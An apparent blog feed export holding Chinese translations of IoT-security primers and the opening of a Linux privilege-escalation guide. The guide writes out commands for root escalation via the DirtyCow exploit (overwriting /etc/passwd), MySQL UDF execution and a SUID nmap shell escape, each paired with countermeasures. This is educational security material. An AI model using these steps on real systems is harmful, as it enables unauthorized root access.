<li>混合 Hybrid：这些是上述两种类型的组合，即温度控制、基于一天中的时间的灯等。这是关键接口之一，因为来自物理世界的所有值和数据都将传输到云中。如果攻击者可以使用格式错误（错误）的数据控制设备，那么整个生态系统都会受到影响，因为所有决策和统计数据都基于这些数据。换句话说，这是物联网生态系统的症结所在。此处错误的值可能会对生态系统做出的决策产生灾难性影响。</li>
</ol>
</li>
</ul>
<h4 id="2-7_人机界面">2.7 人机界面</h4><p>与传感器接口一样，我们使用 HMI 作为通用术语来定义用户和设备之间的接口，但不限于工业控制系统中使用的术语。这是用户可以用来与设备通信并直接对其进行操作的界面。一些常见的例子是触摸屏、按钮、触摸板等。 测试这个界面以找出任何绕过机制、安全漏洞等很重要。</p>
<h4 id="2-8_其他硬件接口">2.8 其他硬件接口</h4><p>还有许多其他硬件接口用于与设备进行通信。作为渗透测试者，分析和发现所有接口中的缺陷和绕过机制很重要。一些众所周知的接口包括（但不限于）：</p>
<ul>
<li><ol>
<li>D-Subminiature – <a href="https://en.wikipedia.org/wiki/D-subminiature" target="_blank" rel="external">https://en.wikipedia.org/wiki/D-subminiature</a></li>
</ol>
</li>
<li><ol start="2">
<li>推荐标准（RS232、RS485 等）– 有关 RS 协议的更多详细信息，请访问 <a href="https://en.wikipedia.org/wiki/EIA_standards" target="_blank" rel="external">https://en.wikipedia.org/wiki/EIA_standards</a></li>
</ol>
</li>
<li><ol start="3">
<li>车载诊断 (OBD) – <a href="https://en.wikipedia.org/wiki/On-board_diagnostics" target="_blank" rel="external">https://en.wikipedia.org/wiki/On-board_diagnostics</a></li>
</ol>
</li>
</ul>
<h3 id="3-_网络通讯接口">3. 网络通讯接口</h3><p>该接口允许设备与虚拟世界的其余部分通信，包括传感器网络、云和移动设备。负责网络通信的硬件接口可能有自己独立的微控制器/固件来提供通信功能。这种情况下的攻击面是实现低级通信的固件或驱动程序代码。</p>
<h4 id="3-1_WIFI无线网络">3.1 WIFI无线网络</h4><p>wifi 接口有一些已知问题。从攻击面的角度来看，攻击 wifi 芯片方法包括损坏它、DOS、绕过安全限制或代码执行会很有趣。</p>
<h4 id="3-2_以太网">3.2 以太网</h4><p>以太网接口与 wifi 接口一样，也存在低级 TCP/IP 堆栈漏洞以及硬件实现漏洞和类似的攻击向量。</p>
<h4 id="3-3_无线电">3.3 无线电</h4><p>考虑到许多物联网产品已转向/正在使用无线电通信构建，无线电接口已成为最重要的攻击面之一。这种偏好源于这样一个事实，即在许多情况下使用无线电更有效比通过 Wifi/有线网络连接。我将 Wifi 单独分类而不是在本节中的原因主要是为了明确区分可以直接连接到互联网的设备（Wifi/有线）和需要网关（例如智能集线器）的设备，该网关同时实现Radio以及Wifi/Wired接口，分别与传感器和互联网进行通信。 从实际通信的角度来看，可以将其视为两种不同的通信方式：</p>
<p><strong>1. 简单/非结构化：</strong> 这种类型通常用于简单的产品，如百叶窗、锁、门铃等。简单和非结构化是指它使用简单（主要是专有）数据（流）并通过无线电接口发送它。作为渗透测试人员，您需要对通信进行逆向工程以找出实现上的缺陷。使用无线电嗅探硬件工具（如 SDR（软件定义无线电）等）很容易嗅探无线电通信。</p>
<p><strong>2. 复杂/结构化：</strong> 复杂和结构化通信意味着它使用结构化数据包进行无线电通信，这些数据包很复杂，因为除了数据之外，它们还携带有关协议的附加和元信息。由于高效、标准化、经济的芯片、实施的便利性，这些协议在物联网世界中非常有名。同样，有多种工具可用于嗅探和解析协议以提取所发送的应用程序特定数据。一些常见的协议包括：</p>
<ul>
<li>a．蓝牙（和 BLE）</li>
<li>b. ZigBee</li>
<li>C. Z波</li>
<li>D. NFC</li>
<li>E. RFID</li>
<li>F. LORA</li>
<li>g. Wireless HART</li>
</ul>
<h2 id="参考">参考</h2><ul>
<li><ol>
<li>UART – <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver/transmitter" target="_blank" rel="external">https://en.wikipedia.org/wiki/Universal_asynchronous_receiver/transmitter</a></li>
</ol>
</li>
<li><ol start="2">
<li>Types of memory – <a href="https://en.wikipedia.org/wiki/Semiconductor_memory" target="_blank" rel="external">https://en.wikipedia.org/wiki/Semiconductor_memory</a></li>
</ol>
</li>
<li><ol start="3">
<li>JTAG – <a href="https://en.wikipedia.org/wiki/JTAG" target="_blank" rel="external">https://en.wikipedia.org/wiki/JTAG</a></li>
</ol>
</li>
<li><ol start="4">
<li>SWD – <a href="https://www.arm.com/files/pdf/Serial_Wire_Debug.pdf" target="_blank" rel="external">https://www.arm.com/files/pdf/Serial_Wire_Debug.pdf</a></li>
</ol>
</li>
<li><ol start="5">
<li>JTAG Vs. SWD – <a href="https://electronics.stackexchange.com/questions/53571/jtag-vs-swd-debugging" target="_blank" rel="external">https://electronics.stackexchange.com/questions/53571/jtag-vs-swd-debugging</a></li>
</ol>
</li>
<li><ol start="6">
<li>I2C – <a href="https://en.wikipedia.org/wiki/I%C2%B2C" target="_blank" rel="external">https://en.wikipedia.org/wiki/I%C2%B2C</a></li>
</ol>
</li>
<li><ol start="7">
<li>IoT Protocols – <a href="https://www.postscapes.com/internet-of-things-protocols/" target="_blank" rel="external">https://www.postscapes.com/internet-of-things-protocols/</a></li>
</ol>
</li>
<li><ol start="8">
<li>I2C Serial EEPROM image source – <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg/180px-AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg" target="_blank" rel="external">https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg/180px-AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg</a></li>
</ol>
</li>
<li><ol start="9">
<li>JTAG port image source – <a href="https://i.stack.imgur.com/IiUqm.jpg" target="_blank" rel="external">https://i.stack.imgur.com/IiUqm.jpg</a></li>
</ol>
</li>
</ul>
<p><em>原文链接：<a href="https://payatu.com/iot-security-part-2-101-iot-attack-surface" target="_blank" rel="external">https://payatu.com/iot-security-part-2-101-iot-attack-surface</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="物联网攻击面">物联网攻击面</h2><p>欢迎！我希望您已经阅读了之前的博客文章<a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分</a>，如果没有，希望你阅读它以了解物联网和物联网架构的含义。现在我们将开始进入安全领域，并尝试定义一种方法来理解和创建结构化流程来执行物联网的安全研究或渗透测试。<br>如果我们查看上一篇文章中定义的架构，现在我们可以轻松的对物联网进行拆分并尝试为每个组件单独定义攻击面，然后将它们组合起来以创建整个物联网生态系统攻击面。我称其为 IoT 生态系统而不是 IoT 产品，因为它确实是一个由不同组件相互通信并解决特定现实世界问题的生态系统。下面将继续定义物联网生态系统的攻击面，并详细讨论每个组件的攻击面。按组件的攻击面可以将物联网组件攻击面分为三个或四个（如果我们将通信作为攻击面），主要攻击面如下：</p>
<ul>
<li><ol>
<li>移动应用</li>
</ol>
</li>
<li><ol start="2">
<li>云</li>
</ol>
</li>
<li><ol start="3">
<li>通信</li>
</ol>
</li>
<li><ol start="4">
<li>物联网终端设备<div align="center"><br><img src="/img/20210921device_attack_surface-768x456.png" align=""/><br></div>

</li>
</ol>
</li>
</ul>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-1.物联网介绍及其架构（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/"/>
    <id>http://www.youngroe.com/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/</id>
    <published>2021-09-21T11:39:22.000Z</published>
    <updated>2021-11-06T02:01:10.204Z</updated>
    <content type="html"><![CDATA[<p>最近，我收到了一些对物联网安全感兴趣的人的问题，询问从哪里开始物联网安全研究，因此，我决定做一组有关物联网安全的文章，以帮助想要进入物联网安全、物联网渗透测试和漏洞利用领域的研究人员。<br>对于安全研究人员而言，每项新技术和复杂技术的问题都可能是不知道从哪里开始以及如何、从哪里进行攻击。这是一个非常常见的问题，并且有一个通用的解决方案，即对技术进行分解为多个部分并单独学习每个部分。这个过程可以让你掌握了每个部分的知识，并引导你专注于其中的最有趣的部分。如果你都读到这里，我会假设你会坚持继续学习。所以，不要拖延，让我们开始吧:)。</p>
<p><strong>注意：</strong></p>
<ul>
<li><ol>
<li>本系列中文章中的知识的是通用的，可以应用于任何领域的物联网产品的安全研究，无论其用途如何，包括家庭自动化、工业控制系统、医疗保健、交通等。</li>
</ol>
</li>
<li><ol start="2">
<li>我将使用这些词除非在解释中特别提及，否则设备、硬件和传感器可互换地表示相同的事物。</li>
</ol>
</li>
<li><ol start="3">
<li>我提到物联网生态系统是指物联网产品或解决方案，因为物联网技术的性质包含很多不同的技术。</li>
</ol>
</li>
</ul>
<a id="more"></a>
<h2 id="物联网_!=_硬件">物联网 != 硬件</h2><p>这是人们普遍存在的一种误解，即物联网仅意味着硬件，这会造成一个的障碍，并阻止大多数安全研究人员进入物联网安全领域。是的，即使涉及硬件，也可以学习分析它所需的技能。学习硬件知识可以降低学习物联网安全技术的难度，并且学习硬件相关的技术需要一定的恒心和毅力。当您阅读完本文时，您会意识到硬件仅占 IoT 生态系统的 1/3 部分。更重要的是如果您可以攻击其他组件（例如云），可能会造成比入侵设备更多的损害。几年前，当我开始研究物联网安全时，我也有同样的顾虑，所以我把问题分解，各个击破，在此过程中学到了一些很酷的技巧。相信我，我这样的普通人都可以做到。</p>
<h2 id="介绍">介绍</h2><h3 id="什么是物联网？">什么是物联网？</h3><p>网上有很多关于物联网的定义，掌握一项技术的关键是了解它背后的基本意识形态，这有助于你了解它并根据之前的经验学习它。每个人都可以有自己的定义，对我来说，物联网是关于三件重要的事情<br><strong>1. 自动化：</strong> 坦率地说人都是懒惰的，未来就是让我们变得更懒惰并自动化我们目前手动完成的任何事情。<br><strong>2. 虚拟世界与物理世界之间的接口</strong>：在物理世界和虚拟世界之间架起一座桥梁。简单来说，允许虚拟世界从/向物理世界读取和写入。当我说读取时，我的意思是感知物理环境并将状态转换为数据并将其发送到虚拟数据存储以进行进一步分析，例如温度传感器、医疗传感器、相机等。 写入是指通过动作来控制物理世界的方法，即将数据转换为物理世界上的动作，例如门锁、控制车辆操作、喷水、医疗泵等。<br><strong>3. 信息收集和决策制定：</strong> 可以实时分析从设备收集的数据，以更好地了解环境、对某些事件采取行动、找出任何物理世界问题的根本原因等。</p>
<p>因此，物联网技术为用户和厂商提供了实时信息和任务的自动化。<br>基于上述定义，如果我们要创造一种技术来解决这个问题，我们需要</p>
<ul>
<li><ol>
<li>提供虚拟与现实之间接口的硬件设备</li>
</ol>
</li>
<li><ol start="2">
<li>用于存储数据的后端存储和对数据进行统计分析的计算能力.</li>
</ol>
</li>
<li><ol start="3">
<li>用户查看分析数据以及向物理世界发送命令的虚拟界面。</li>
</ol>
</li>
</ul>
<p>第一个是通过嵌入相应传感器、控制器的经济硬件设备来解决，第二个是通过云方便地解决，最后第三个是通过移动应用程序和/或网络应用程序轻松解决。</p>
<h3 id="哪里使用了物联网？">哪里使用了物联网？</h3><p>正如我上面提到的，物联网就是让我们变胖和变懒。人类善于创新，无论出于何种原因，我们都可以在近乎完美的系统中找出可以改进的地方。在当今世界，物联网技术的使用是无限的。我敢打赌，只要你往周围看一下，你就可能会有一个物联网应用的想法。目前物联网在各个领域都出现了大量创新，主要目标都是是物理世界的自动化和实时数据分析，包含以下领域：</p>
<ul>
<li><ol>
<li>家庭自动化</li>
</ol>
</li>
<li><ol start="2">
<li>智能基础设施</li>
</ol>
</li>
<li><ol start="3">
<li>医疗保健</li>
</ol>
</li>
<li><ol start="4">
<li>工业控制系统</li>
</ol>
</li>
<li><ol start="5">
<li>交通运输</li>
</ol>
</li>
<li><ol start="6">
<li>实用工具</li>
</ol>
</li>
<li><ol start="7">
<li>以及更多</li>
</ol>
</li>
</ul>
<h2 id="物联网架构">物联网架构</h2><h3 id="高级视图">高级视图</h3><p>最简单的物联网架构包括三个组件，如下图所示。</p>
<ol>
<li>移动应用</li>
<li>云</li>
<li>物联网终端</li>
</ol>
<div align="center"><br><img src="/img/20210921iot_components-768x454.png" align><br></div>

<p>组件之间使用哪种通信方式取决于物联网产品的用途和类型。以下是一些例子，说明哪些组件之间会通信以及如何通信。</p>
<ul>
<li><ol>
<li>物联网终端仅与移动应用 – 例如基于蓝牙 BLE 的设备</li>
</ol>
</li>
<li><ol start="2">
<li>物联网终端仅与物联网网关对话 - 例如ZigBee、无线 HART 设备等。</li>
</ol>
</li>
<li><ol start="3">
<li>移动设备仅与云通话——在用户无法近距离访问设备且只能通过云进行控制的情况下。</li>
</ol>
</li>
</ul>
<h3 id="功能架构">功能架构</h3><p>对物联网从功能架构上可以进一步定义为一个通过移动网络或者互联网进行连接的传感器网络。传感器可能拥有自己的基于传统 TCP/IP 的技术或基于无线电的网络，以防传统电信网络或者无线电通信无法实现的情况。在后一种情况下，需要有一个网关（我们所谓的物联网网关/集线器/路由器）作为无线电通信和传统 TCP/IP 通信之间的接口。从现在开始，我将把 TCP/IP 称为传统的网络通信。</p>
<div align="center"><br><img src="/img/20210921cloud_iot_1-768x415.png" align><br></div>

<p>我们还可以在不同地方多个传感器网络，这些网络可以通过物联网网关通过传统网络相互通信和连接，如下所示。</p>
<div align="center"><br><img src="/img/20210921cloud_iot_2-768x335.png" align><br></div>

<h3 id="分层模型">分层模型</h3><p>如果我们从分层的角度来看物联网技术，我们可以将物联网技术核心划分为3层。</p>
<ol>
<li>传感层——由硬件传感器和传感器网络组成。</li>
<li>通信层——这包括允许传感层与管理层进行通信的通信网络，例如——Wifi、3G、LTE、以太网等。</li>
<li>管理层——这是最顶层，负责理解原始数据并为用户提供可视化视图。它包括云、存储、应用程序等。<div align="center"><br><img src="/img/20210921iot_layered-768x519.png" align><br></div>

</li>
</ol>
<p>如果您正在阅读本文，那么您对物联网安全非常感兴趣:)。这篇博文的目的是让您了解物联网技术。后续，我们将开始谈论物联网安全。下一篇博文将讲述物联网生态系统的攻击面。我希望你喜欢阅读这篇文章，就像我喜欢写它一样:)。</p>
<p><em>原文链接：<a href="https://payatu.com/iot-security-part-1-101-iot-introduction-architecture" target="_blank" rel="external">https://payatu.com/iot-security-part-1-101-iot-introduction-architecture</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近，我收到了一些对物联网安全感兴趣的人的问题，询问从哪里开始物联网安全研究，因此，我决定做一组有关物联网安全的文章，以帮助想要进入物联网安全、物联网渗透测试和漏洞利用领域的研究人员。<br>对于安全研究人员而言，每项新技术和复杂技术的问题都可能是不知道从哪里开始以及如何、从哪里进行攻击。这是一个非常常见的问题，并且有一个通用的解决方案，即对技术进行分解为多个部分并单独学习每个部分。这个过程可以让你掌握了每个部分的知识，并引导你专注于其中的最有趣的部分。如果你都读到这里，我会假设你会坚持继续学习。所以，不要拖延，让我们开始吧:)。</p>
<p><strong>注意：</strong></p>
<ul>
<li><ol>
<li>本系列中文章中的知识的是通用的，可以应用于任何领域的物联网产品的安全研究，无论其用途如何，包括家庭自动化、工业控制系统、医疗保健、交通等。</li>
</ol>
</li>
<li><ol start="2">
<li>我将使用这些词除非在解释中特别提及，否则设备、硬件和传感器可互换地表示相同的事物。</li>
</ol>
</li>
<li><ol start="3">
<li>我提到物联网生态系统是指物联网产品或解决方案，因为物联网技术的性质包含很多不同的技术。</li>
</ol>
</li>
</ul>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux权限提升指南（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/08/20/Cybersecurity/guide-linux-privilege-escalation/"/>
    <id>http://www.youngroe.com/2021/08/20/Cybersecurity/guide-linux-privilege-escalation/</id>
    <published>2021-08-20T11:39:22.000Z</published>
    <updated>2021-11-05T14:22:46.798Z</updated>
    <content type="html"><![CDATA[<h2 id="0x0_介绍">0x0 介绍</h2><p>应用或者进程获取的权限应该按照最小权限原则赋予，只授予执行各自功能最小权限。授予不需要的权限可能回导致权限滥用，同时权限提升也是检测恶意代码的一个重要指标。</p>
<h2 id="0x01_什么是权限提升？">0x01 什么是权限提升？</h2><p>大多数计算机系统被设计为供多个用户使用。权限是指允许用户做什么。常见权限包括查看和编辑文件、修改系统文件等。权限提升是指用户获得他们无权获得的权限。这些权限可用于删除文件、查看隐私信息或安装恶意程序（如病毒）。它通常发生在系统存在允许绕过系统安全机制漏洞时，或者系统设计假设存在缺陷时。<br>权限提升是利用操作系统或软件应用程序中的错误、设计缺陷或配置疏忽来获得应用程序或用户保护的资源的更高访问权限的行为。结果是应用程序拥有比执行未经授权操作的开发人员或系统管理员预期更多的权限。<br>虽然根据统计大部分公司使用的更多的是 Windows 客户端程序，但在考虑到公司的网络安全时，Linux 特权升级攻击则是需要应对的更大的威胁。公司的关键基础设施，例如 Web 服务器、数据库、防火墙等，很可能运行在 Linux 操作系统。对这些关键基础设施的损害有可能严重破坏组织的运营。此外，物联网 (IoT) 和嵌入式系统在工作场所变得无处不在，从而增加了恶意黑客的潜在目标数量。鉴于 Linux 设备在工作场所的流行，公司应该加强和保护这些设备。</p>
<a id="more"></a>
<h2 id="0x02_目的">0x02 目的</h2><p>在本文中，我们将详细讨论任何可能对基于 Linux 的系统成功进行权限提升攻击的安全问题。我们还将讨论攻击者如何使用已知技术提升在远程主机上的权限，以及如何保护我们的系统免受任何此类攻击。最后，我们将举例说明如何在不同的 Linux 系统上在不同的条件下实现权限提升。<br>本文旨在通过示例帮助初学者了解 Linux 权限提升的基础知识。它不是列举 Linux 提权方法的备忘单。权限提升与使用正确的方法有关。有多种方法可以执行示例中相同任务。如果你想要一个对 Linux 进行提权的备忘单，那么你一定要看看 g0tmi1k 的文章 – <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="external">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
<h2 id="0x03_Linux权限模型">0x03 Linux权限模型</h2><div align="center"><br><img src="/img/20210820Linux_privage.png" align><br></div><br>Linux 从 UNIX 继承了文件所有权和权限的概念。文件权限是系统保护自己免受恶意篡改的一种方式。在 UNIX 网络服务器上，存储在硬盘驱动器上的每个文件和文件夹都有一组与之相关的权限，这说明了谁可以对文件执行什么操作。<br><br><div align="center"><br><img src="/img/20210820Linux_whoami.png" align><br></div>

<p>在上面的两个截图中，我们可以看到文件“docker-compose.yml”只有所有者“root”具有读取权限。如果任何其他用户尝试读取此文件，他将无法读取它。当我不是超级用户时尝试读取文件时，我们可以看到权限被拒绝。</p>
<p>我们不会在这里详细介绍权限模型，因为这是另一个大话题。这只是为了理解用户无法访问（read/write/execute）他不被允许访问的文件的事实。但是，超级用户（root）可以访问系统上存在的所有文件。为了修改任何重要的配置或执行任何进一步的攻击，首先我们需要在任何基于 Linux 的系统上获得 root 访问权限。</p>
<h2 id="0x04_为什么需要提权">0x04 为什么需要提权</h2><ul>
<li>读/写任何敏感文件</li>
<li>即使重启也能持久化</li>
<li>植入永久后门</li>
</ul>
<h2 id="0x05_提权主要使用的技术">0x05 提权主要使用的技术</h2><p>我们假设现在我们在远程系统上有 shell。但我们可能没有“root”权限。下面提到的技术可用于在系统上获得“root”权限。</p>
<h3 id="1-内核漏洞利用代码">1.内核漏洞利用代码</h3><p>内核漏洞利用代码是利用内核漏洞以提升权限执行任意代码的程序。成功的内核漏洞利用通常会以 root 命令提示符的形式为攻击者提供对目标系统的超级用户访问权限。在许多情况下，在 Linux 系统上提升到 root 权限就像将内核漏洞下载到目标文件系统、编译漏洞然后执行它一样简单。<br>假设我们可以以非特权用户身份运行代码，这就是内核漏洞利用的通用工作流程。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 欺骗内核在内核模式下运行我们的payload</span><br><span class="line"><span class="number">2.</span> 操作内核数据，例如进程权限</span><br><span class="line"><span class="number">3.</span> 以新权限启动shell 获取root！</span><br></pre></td></tr></table></figure>
<p>内核漏洞攻击要成功，攻击者需要四个条件：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 有漏洞的内核</span><br><span class="line"><span class="number">2.</span> 与漏洞相匹配的漏洞利用程序</span><br><span class="line"><span class="number">3.</span> 将漏洞利用程序上传到目标的能力</span><br><span class="line"><span class="number">4.</span> 在目标上执行漏洞利用的能力</span><br></pre></td></tr></table></figure>
<p>防御内核漏洞的最简单方法是对内核进行打补丁和更新。在没有补丁的情况下，管理员需要截断向目标上传和执行漏洞利用程序的过程。考虑到这些因素，如果管理员可以阻止将漏洞利用引入或执行到 Linux 文件系统，则内核漏洞利用攻击不再可行。因此，管理员应重点限制或删除启用文件传输的程序，例如 FTP、TFTP、SCP、wget 和 curl。当需要这些程序时，它们的使用应限于特定用户、目录、应用程序（例如 SCP）和特定 IP 地址或域。</p>
<p><strong>臭名昭著的 DirtyCow 漏洞——Linux 内核 &lt;= 3.19.0-73.8</strong></p>
<p>在 Linux 内核的内存子系统处理私有只读内存映射的写时复制 (COW) 的方式中存在竞争条件漏洞。无特权的本地用户可以利用此漏洞获得对其他只读内存映射的写访问权限，从而增加他们在系统上的特权。这是有史以来发现的最严重的提权漏洞之一，几乎影响了所有主要的 Linux 发行版。<br>通过dirtycow漏洞实现利用</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>whoami – 告诉我们当前用户是 john（非 root 用户）</span><br><span class="line"><span class="variable">$ </span>uname -a – 让我们知道容易受到dirtycow 攻击的内核版本</span><br><span class="line">&gt; 从这里下载了dirtycow漏洞——<span class="symbol">https:</span>/<span class="regexp">/www.exploit-db.com/exploits</span><span class="regexp">/40839/</span></span><br><span class="line">&gt; 编译并执行它。它通过编辑 /etc/passwd 文件将“root”用户替换为新用户“rash”。</span><br><span class="line"><span class="variable">$ </span>su rash - 它将当前登录的用户更改为 root 的“rash”。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820dirtycow.png" align><br></div>

<p>您可以在这里查看dirtycow漏洞利用的其他版本 – <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="external">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a><br>有许多不同的本地提权漏洞可用于不同的内核和操作系统。是否可以使用内核漏洞在 Linux 主机上获得 root 访问权限取决于内核是否有漏洞。 Kali Linux 有一个exploit-db 漏洞的本地副本，可以更容易地搜索本地root 漏洞。虽然我不建议在搜索 Linux 内核漏洞时完全依赖这个数据库。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit Linux Kernel <span class="number">2.6</span><span class="number">.24</span> – 它向我们展示了 kali Linux 中已经存在的特定 Linux 内核的所有可用漏洞。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820searchsploit.png" align><br></div>

<p>为什么应该首先避免运行任何本地提权漏洞利用程序呢？<br>虽然，运行漏洞利用程序并获得 root 访问权限感觉很诱人，但您应该始终将此作为最后的选择。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 远程主机可能会崩溃，因为许多公开可用的 root 漏洞都不是很稳定。</span><br><span class="line"><span class="number">2.</span> 您可能获得了 root 权限，然后系统崩溃了。</span><br><span class="line"><span class="number">3.</span> 漏洞利用可能会留下可以让您被抓住的痕迹/日志。</span><br></pre></td></tr></table></figure>
<p>在运行内核提权漏洞之前，您应该始终尝试使用下面讨论的其他技术来获取 root。</p>
<p><strong>对策：</strong><br>经常对内核打补丁和更新。</p>
<h3 id="2-利用以_root_身份运行的服务">2.利用以 root 身份运行的服务</h3><p>利用以 root 身份运行的任何服务都会为您提供 Root 权限！</p>
<p>著名的 <a href="https://en.wikipedia.org/wiki/EternalBlue" target="_blank" rel="external">EternalBlue</a> 和 <a href="https://thehackernews.com/2017/05/samba-rce-exploit.html" target="_blank" rel="external">SambaCry</a> 漏洞利用，利用了通常以 root 身份运行的 smb 服务。<br>只需一个漏洞，攻击者就可以获得远程代码执行和本地权限提升。<br>由于它的致命组合，它被大量用于在全球范围内传播勒索软件。<br>您应该经常检查 Web 服务器、邮件服务器、数据库服务器等是否以 root 身份运行。很多时候，Web 管理员以 root 身份运行这些服务而忘记了它可能导致的安全问题。可能存在在本地运行且未公开的服务也可以被利用。</p>
<p><code>$ netstat -antup – 它会显示所有打开并正在侦听的端口。我们可以检查本地运行的服务是否可以被利用。</code></p>
<p><strong>利用以 root 身份运行的易受攻击的 MySQL 版本来获取 root 访问权限</strong></p>
<p><a href="https://www.exploit-db.com/exploits/1518/" target="_blank" rel="external">MySQL UDF 动态库漏洞利用</a>允许您从 mysql shell 执行任意命令。如果 mysql 以 root 权限运行，则命令将以 root 身份执行。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">ps</span> -aux | <span class="keyword">grep</span> root - 它向我们展示了以 root 身份运行的服务。</span><br><span class="line">&gt; 我们可以使用 MySQL <span class="keyword">shell</span> 执行任意命令，这些命令将以 root 身份执行。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820mysql_root.png" align><br></div>

<div align="center"><br><img src="/img/20210820mysql_udf_root.png" align><br></div>

<p>Web 管理员犯的最大错误之一就是以 root 权限运行 Web 服务器。 Web 应用程序上的命令注入漏洞可将攻击者引导至 root shell。这是一个典型的例子，说明为什么除非真的需要，否则不应以 root 身份运行任何服务。</p>
<p>对拥有 root 权限的程序进行二进制漏洞利用远没有内核漏洞利用那么危险，因为即使服务崩溃，主机也不会崩溃，服务可能会自动重启。</p>
<p><strong>对策：</strong><br>除非确实需要，否则切勿以 root 身份运行任何服务，尤其是 Web、数据库和文件服务器。</p>
<h3 id="3-利用_SUID_可执行文件">3.利用 SUID 可执行文件</h3><p>SUID 代表 set user ID，是 Linux 的一项功能，允许用户以指定用户的权限执行文件。例如，Linux ping 命令通常需要 root 权限才能打开原始网络套接字。通过将 ping 程序标记为 SUID，所有者为 root，只要低权限用户执行程序，ping 就会以 root 权限执行。</p>
<p><code>&gt; -rwsr-xr-x——“s”字符而不是“x”表示设置了 SUID 位。</code></p>
<div align="center"><br><img src="/img/20210820ping_suid_bit.png" align><br></div>

<p>SUID 是一项功能，如果使用得当，实际上可以增强 Linux 的安全性。问题是管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的 SUID 配置。<br>很多系统管理员不明白在哪里设置 SUID 位，在哪里不设置。不应在任何文件编辑器上特别设置 SUID 位，因为攻击者可以覆盖系统上存在的任何文件。</p>
<p><strong>利用易受攻击的 SUID 可执行文件获取 root 访问权限</strong></p>
<p><code>$ find / -perm -u=s -type f 2&gt;/dev/null – 打印设置了 SUID 位的可执行文件</code></p>
<div align="center"><br><img src="/img/20210820suid_bit_set_nmap.png" align><br></div>

<p><code>$ ls -la /usr/local/bin/nmap – 让我们确认 nmap 是否设置了 SUID 位。</code></p>
<div align="center"><br><img src="/img/20210820suid_nmap.png" align><br></div>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; Nmap 设置了 SUID 位。很多时候管理员为<span class="keyword">nmap</span>设置了SUID，以便它可以用于有效地扫描网络，因为如果您不以 root 权限运行它，所有 <span class="keyword">nmap</span> 扫描技术都不起作用。</span><br><span class="line">&gt; 但是，<span class="keyword">nmap</span> 旧版本中有一项功能，您可以在其中以交互模式运行 <span class="keyword">nmap</span>，从而可以转义到 <span class="keyword">shell</span>。如果 <span class="keyword">nmap</span> 设置了 SUID 位，它将以 root 权限运行，我们可以通过它的交互模式访问“root”<span class="keyword">shell</span>。</span><br><span class="line">$ <span class="keyword">nmap</span> –interactive – 运行 <span class="keyword">nmap</span> 交互模式</span><br><span class="line">$ !sh – 让你从 <span class="keyword">nmap</span> <span class="keyword">shell</span> 切换到系统 <span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820nmap_root.png" align><br></div>

<p><strong>对策：</strong></p>
<ul>
<li>不应将 SUID 位设置为任何能够变换为 shell 的程序。</li>
<li>永远不要在任何文件编辑器/编译器/解释器上设置 SUID 位，因为攻击者可以轻松读取/覆盖系统上存在的任何文件。</li>
</ul>
